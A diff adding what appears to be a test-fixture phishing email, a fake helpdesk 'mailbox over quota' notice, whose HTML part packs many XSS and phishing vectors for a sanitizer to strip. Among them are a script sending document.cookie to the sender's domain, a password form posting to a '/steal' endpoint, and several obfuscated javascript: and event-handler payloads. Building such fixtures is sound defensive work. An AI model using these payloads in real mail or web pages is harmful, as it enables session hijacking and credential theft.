@@ -1,0 +1,44 @@
+From: "IT Helpdesk" <helpdesk@isupply-support.example>
+To: sara.hassan@isupply.test
+Subject: Action required: mailbox quota exceeded
+Date: Tue, 10 Feb 2026 07:45:00 +0200
+Message-ID: <x011@isupply-support.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="b011-alt"
+
+--b011-alt
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+Your mailbox is over quota. Visit the link to keep receiving mail.
+
+--b011-alt
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"refresh" content=3D"0;url=3Dhttps://isupply-support.exa=
+mple/login">
+<base href=3D"https://isupply-support.example/">
+<style>body { background: url(javascript:alert(1)); } .x { width: expressio=
+n(alert(2)); } @import url(https://isupply-support.example/track.css);</sty=
+le>
+<script>fetch('https://isupply-support.example/c?'+document.cookie)</script>
+</head><body onload=3D"alert(3)">
+<p>Your mailbox is <b>over quota</b>.</p>
+<p><a href=3D"javascript:alert(4)">Click here</a> or visit <a href=3D"https=
+://isupply-support.example/login">https://mail.isupply.test/quota</a>.</p>
+<img src=3D"x" onerror=3D"alert(5)">
+<iframe src=3D"https://isupply-support.example/frame" srcdoc=3D"<script>ale=
+rt(6)</script>"></iframe>
+<object data=3D"https://isupply-support.example/x.swf"></object>
+<embed src=3D"https://isupply-support.example/x.swf">
+<form action=3D"https://isupply-support.example/steal" method=3D"post"><inp=
+ut name=3D"password" type=3D"password"><button>Keep my mailbox</button></fo=
+rm>
+<svg onload=3D"alert(7)"><circle r=3D"1"/></svg>
+<a href=3D"data:text/html;base64,PHNjcmlwdD5hbGVydCg4KTwvc2NyaXB0Pg=3D=3D">=
+open</a>
+<a href=3D" JaVaScRiPt:alert(9)">obfuscated</a>
+</body></html>
+--b011-alt--
